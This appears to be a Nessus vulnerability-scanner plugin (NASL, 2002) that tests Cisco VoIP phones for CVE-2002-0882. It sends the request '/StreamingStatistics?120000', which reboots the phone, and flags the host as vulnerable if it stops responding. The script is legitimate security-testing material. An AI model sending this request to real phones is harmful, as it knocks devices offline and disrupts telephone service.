#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      Added BugtraqID and CAN
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(11013);
 script_bugtraq_id(4794, 4798);
 script_version ("$Revision: 1.15 $");
 script_cve_id("CVE-2002-0882");
 
 name["english"] = "Cisco VoIP phones DoS";
 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to reboot the remote host by requesting :

	http://<phone-ip>/StreamingStatistics?120000
	

Solution : http://www.cisco.com/warp/public/707/multiple-ip-phone-vulnerabilities-pub.shtml
Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "CISCO check";
 script_summary(english:summary["english"]);
 script_category(ACT_KILL_HOST);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_dependencie("find_service.nes", "no404.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);


# we don't use start_denial/end_denial because they
# might be too slow (the phone takes 15 seconds to reboot)

alive = tcp_ping(port:port);
if(alive)
{
 soc = http_open_socket(port);
 if(!soc)exit(0);
 req = http_get(item:"/StreamingStatistics?120000", port:port);
 send(socket:soc, data:req);
 sleep(5);
 alive = tcp_ping(port:port);
 if(!alive)security_hole(port);
 else http_close_socket(soc);
}


